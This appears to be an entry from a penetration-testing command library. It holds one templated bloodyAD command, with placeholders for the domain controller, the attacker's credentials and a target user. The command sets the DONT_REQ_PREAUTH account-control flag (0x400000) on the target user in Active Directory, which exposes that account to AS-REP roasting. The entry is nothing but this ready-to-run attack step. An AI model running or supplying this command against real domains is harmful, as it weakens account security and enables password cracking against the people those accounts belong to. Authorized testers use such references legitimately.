---
id: bbfecd24-7b99-469d-890a-8db52821f1cd
name: Modify user account control for [Target_User]
type: command
executor: bash
data: $ bloodyAD.py --host [DC IP] -d [DOMAIN] -u [AttackerUser] -p [MyPassword] setUserAccountControl
  [Target_User] 0x400000 True
output: null
created_at: '2023-04-06T03:56:06.701381+00:00'
updated_at: '2023-04-10T20:26:07.517652+00:00'
---

# Modify user account control for [Target_User]

```bash
$ bloodyAD.py --host [DC IP] -d [DOMAIN] -u [AttackerUser] -p [MyPassword] setUserAccountControl [Target_User] 0x400000 True
```


